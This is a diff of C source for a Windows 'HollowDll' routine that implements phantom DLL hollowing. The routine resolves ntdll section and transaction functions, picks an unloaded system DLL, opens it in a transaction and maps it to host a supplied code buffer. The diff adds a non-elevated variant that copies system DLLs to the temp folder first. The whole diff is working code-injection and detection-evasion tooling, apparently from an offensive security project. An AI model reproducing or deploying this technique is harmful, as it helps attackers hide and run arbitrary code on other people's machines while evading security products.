@@ -21,18 +21,25 @@ PVOID GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEA
 //
 
 BOOL HollowDll(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCodeBuf, 
-			   uint32_t dwReqBufSize, uint8_t** ppMappedCode, BOOL bTxF, BOOL bIsElevated) {
-	NtCreateSection_t ntCreateSection;
-	NtMapViewOfSection_t ntMapViewOfSection;
-	NtCreateTransaction_t ntCreateTransaction;
+			   const uint32_t dwReqBufSize, uint8_t** ppMappedCode, const BOOL bTxF, const BOOL bIsElevated) {
+	WIN32_FIND_DATAW		wfd = { 0 };
+	WCHAR					cSearchFilePath[MAX_PATH] = { 0 };
+	WCHAR					cTempPath[MAX_PATH] = { 0 };
+	WCHAR					cDllPath[MAX_PATH] = { 0 };
+	WCHAR					cDllDestPath[MAX_PATH] = { 0 };
+	WCHAR					cSysDir[MAX_PATH] = { 0 };
+	HANDLE					hFind;
+	BOOL					bMapped = FALSE;
+		
+	NtCreateSection_t		ntCreateSection;
+	NtMapViewOfSection_t	ntMapViewOfSection;
+	NtCreateTransaction_t	ntCreateTransaction;
 
-	WIN32_FIND_DATAW wfd = { 0 };
-	wchar_t searchFilePath[MAX_PATH] = { 0 };
-	HANDLE hFind;
-	BOOL bMapped = FALSE;
-
+	//
+	// Load required functions from ntdll
+	//
+	
 	const HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
-
 	ntCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
 	ntMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
 	ntCreateTransaction = (NtCreateTransaction_t)GetProcAddress(hNtdll, "NtCreateTransaction");
@@ -41,20 +48,59 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 	// Locate a DLL in the architecture appropriate system folder which has a sufficient image size to hollow for allocation.
 	//
 
-	GetSystemDirectoryW(searchFilePath, MAX_PATH);
-	wcscat_s(searchFilePath, MAX_PATH, L"\\*.dll");
+	GetSystemDirectoryW(cSysDir, MAX_PATH);
+	wcscat_s(cSearchFilePath, MAX_PATH, cSysDir);
+	wcscat_s(cSearchFilePath, MAX_PATH, L"\\*.dll");
 
-	if ((hFind = FindFirstFileW(searchFilePath, &wfd)) != INVALID_HANDLE_VALUE) {
+	if (!bIsElevated) {
+		if (!GetTempPathW(MAX_PATH, cTempPath)) {
+			puts("- Unable to get temporary path.\r\n");
+			return FALSE;
+		}
+
+		if ((hFind = FindFirstFileW(cSearchFilePath, &wfd)) != INVALID_HANDLE_VALUE) {
+			do {
+				// Get path of source
+				wcscat_s(cDllPath, MAX_PATH, cSysDir);
+				wcscat_s(cDllPath, MAX_PATH, L"\\");
+				wcscat_s(cDllPath, MAX_PATH, wfd.cFileName);
+				// Get path of destination
+				wcscat_s(cDllDestPath, MAX_PATH, cTempPath);
+				wcscat_s(cDllDestPath, MAX_PATH, wfd.cFileName);
+
+				if (CopyFileW(cDllPath, cDllDestPath, TRUE)) {
+					printf("+ Copied %ls to %ls\r\n", cDllPath, cDllDestPath);
+				}
+				
+				// Cleanup
+				SecureZeroMemory(cDllPath, MAX_PATH);
+				SecureZeroMemory(cDllDestPath, MAX_PATH);
+			} while (FindNextFileW(hFind, &wfd));
+		}
+
+		// Set path to tmp folder
+		SecureZeroMemory(cSearchFilePath, MAX_PATH);
+		wcscat_s(cSearchFilePath, MAX_PATH, cTempPath);
+		wcscat_s(cSearchFilePath, MAX_PATH, L"*.dll");
+	}
+	
+	if ((hFind = FindFirstFileW(cSearchFilePath, &wfd)) != INVALID_HANDLE_VALUE) {
 		do {
 			if (GetModuleHandleW(wfd.cFileName) == NULL) {
-				HANDLE hFile = INVALID_HANDLE_VALUE, hTransaction = INVALID_HANDLE_VALUE;
-				wchar_t filePath[MAX_PATH];
-				NTSTATUS ntStatus;
-				uint8_t* pFileBuf;
+				HANDLE		hFile = INVALID_HANDLE_VALUE;
+				HANDLE		hTransaction = INVALID_HANDLE_VALUE;
+				WCHAR		cFilePath[MAX_PATH];
+				NTSTATUS	ntStatus;
+				uint8_t*	pFileBuf;
 
-				GetSystemDirectoryW(filePath, MAX_PATH);
-				wcscat_s(filePath, MAX_PATH, L"\\");
-				wcscat_s(filePath, MAX_PATH, wfd.cFileName);
+				if (bIsElevated) {
+					GetSystemDirectoryW(cFilePath, MAX_PATH);
+					wcscat_s(cFilePath, MAX_PATH, L"\\");
+				}
+				else {
+					GetTempPathW(MAX_PATH, cFilePath);
+				}
+				wcscat_s(cFilePath, MAX_PATH, wfd.cFileName);
 
 				//
 				// Read the DLL to memory and check its headers to identify its image size.
@@ -75,7 +121,7 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 						NULL);
 
 					if (NT_SUCCESS(ntStatus)) {
-						hFile = CreateFileTransactedW(filePath,
+						hFile = CreateFileTransactedW(cFilePath,
 							GENERIC_WRITE | GENERIC_READ,
 							0,
 							NULL,
@@ -91,7 +137,7 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 					}
 				}
 				else {
-					hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+					hFile = CreateFileW(cFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 				}
 
 				if (hFile != INVALID_HANDLE_VALUE) {
@@ -227,7 +273,7 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 					}
 				}
 				else {
-					printf("- Failed to open handle to %ws (error %lu)\r\n", filePath, GetLastError());
+					printf("- Failed to open handle to %ws (error %lu)\r\n", cFilePath, GetLastError());
 				}
 			}
 		} while (!bMapped && FindNextFileW(hFind, &wfd));
